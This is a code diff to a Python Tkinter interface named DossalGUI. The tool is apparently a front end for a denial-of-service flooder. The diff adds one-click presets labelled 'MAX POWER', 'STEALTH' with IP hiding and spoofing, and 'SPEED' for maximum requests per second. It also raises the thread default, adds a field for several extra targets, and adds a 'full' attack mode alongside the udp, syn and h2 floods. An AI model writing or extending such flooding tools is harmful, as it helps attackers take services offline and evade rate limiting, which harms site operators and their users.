@@ -30,6 +30,31 @@ class DossalGUI:
         
         self._build_ui()
     
+    def _apply_preset(self):
+        """Apply preset to checkboxes."""
+        preset = self.preset_var.get()
+        if preset == 'power':
+            self.fast_var.set(True)
+            self.spoof_var.set(False)
+            self.stealth_var.set(False)
+            self.recovery_var.set(False)
+            self.threads_var.set('24')
+            self.mode_var.set('combo')
+        elif preset == 'stealth':
+            self.fast_var.set(True)
+            self.spoof_var.set(True)
+            self.stealth_var.set(True)
+            self.recovery_var.set(True)
+            self.threads_var.set('8')
+            self.mode_var.set('auto')
+        elif preset == 'speed':
+            self.fast_var.set(True)
+            self.spoof_var.set(False)
+            self.stealth_var.set(False)
+            self.recovery_var.set(False)
+            self.threads_var.set('32')
+            self.mode_var.set('raw')
+    
     def _build_ui(self):
         # Main frame
         main = ttk.Frame(self.root, padding=10)
@@ -49,8 +74,17 @@ class DossalGUI:
         self.dur_entry = ttk.Entry(target_frame, textvariable=self.dur_var, width=10)
         self.dur_entry.grid(row=1, column=1, sticky=tk.W, pady=5)
         
-        # Options section
-        opt_frame = ttk.LabelFrame(main, text="Options", padding=10)
+        # Profile presets (ONE-CLICK)
+        preset_frame = ttk.LabelFrame(main, text="Profile (one-click)", padding=10)
+        preset_frame.pack(fill=tk.X, pady=5)
+        
+        self.preset_var = tk.StringVar(value="power")
+        ttk.Radiobutton(preset_frame, text="🔥 MAX POWER (fastest, strongest)", variable=self.preset_var, value="power", command=self._apply_preset).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=2)
+        ttk.Radiobutton(preset_frame, text="🕵️ STEALTH (hide IP, 100 spoofed, auto-recover)", variable=self.preset_var, value="stealth", command=self._apply_preset).grid(row=1, column=0, columnspan=3, sticky=tk.W, pady=2)
+        ttk.Radiobutton(preset_frame, text="⚡ SPEED (max RPS, minimal overhead)", variable=self.preset_var, value="speed", command=self._apply_preset).grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=2)
+        
+        # Advanced options (collapsible)
+        opt_frame = ttk.LabelFrame(main, text="Advanced", padding=10)
         opt_frame.pack(fill=tk.X, pady=5)
         
         self.fast_var = tk.BooleanVar(value=True)
@@ -65,21 +99,26 @@ class DossalGUI:
         self.recovery_var = tk.BooleanVar(value=True)
         ttk.Checkbutton(opt_frame, text="Auto-Recover from 429 (blocked IPs)", variable=self.recovery_var).grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=2)
         
-        self.threads_var = tk.StringVar(value="8")
+        self.threads_var = tk.StringVar(value="16")
         ttk.Label(opt_frame, text="Threads:").grid(row=4, column=0, sticky=tk.W, pady=2)
         ttk.Entry(opt_frame, textvariable=self.threads_var, width=10).grid(row=4, column=1, sticky=tk.W, pady=2)
         
+        # Multi-target
+        self.targets_var = tk.StringVar(value="")
+        ttk.Label(opt_frame, text="Extra targets (comma-sep):").grid(row=5, column=0, sticky=tk.W, pady=2)
+        ttk.Entry(opt_frame, textvariable=self.targets_var, width=40).grid(row=5, column=1, columnspan=2, sticky=tk.EW, pady=2)
+        
         # Proxy (optional)
         self.proxy_var = tk.StringVar(value="")
-        ttk.Label(opt_frame, text="Proxy (optional):").grid(row=5, column=0, sticky=tk.W, pady=2)
-        ttk.Entry(opt_frame, textvariable=self.proxy_var, width=40).grid(row=5, column=1, columnspan=2, sticky=tk.EW, pady=2)
+        ttk.Label(opt_frame, text="Proxy (optional):").grid(row=6, column=0, sticky=tk.W, pady=2)
+        ttk.Entry(opt_frame, textvariable=self.proxy_var, width=40).grid(row=6, column=1, columnspan=2, sticky=tk.EW, pady=2)
         
         # Mode selection (optional, auto if Fast Mode)
         self.mode_var = tk.StringVar(value="auto")
-        ttk.Label(opt_frame, text="Mode (auto = smart select):").grid(row=6, column=0, sticky=tk.W, pady=2)
+        ttk.Label(opt_frame, text="Mode (auto = smart select):").grid(row=7, column=0, sticky=tk.W, pady=2)
         mode_combo = ttk.Combobox(opt_frame, textvariable=self.mode_var, width=30,
-                                    values=['auto', 'raw', 'httpsmp', 'h2', 'udp', 'syn', 'combo'])
-        mode_combo.grid(row=6, column=1, sticky=tk.W, pady=2)
+                                    values=['auto', 'raw', 'httpsmp', 'h2', 'udp', 'syn', 'combo', 'full'])
+        mode_combo.grid(row=7, column=1, sticky=tk.W, pady=2)
         
         # Buttons
         btn_frame = ttk.Frame(main)
@@ -172,6 +211,10 @@ class DossalGUI:
         proxy = self.proxy_var.get().strip()
         if proxy:
             cmd.extend(['--proxy', proxy])
+        
+        targets = self.targets_var.get().strip()
+        if targets:
+            cmd.extend(['--targets', targets])
         
         self.running = True
         self.start_time = time.time()
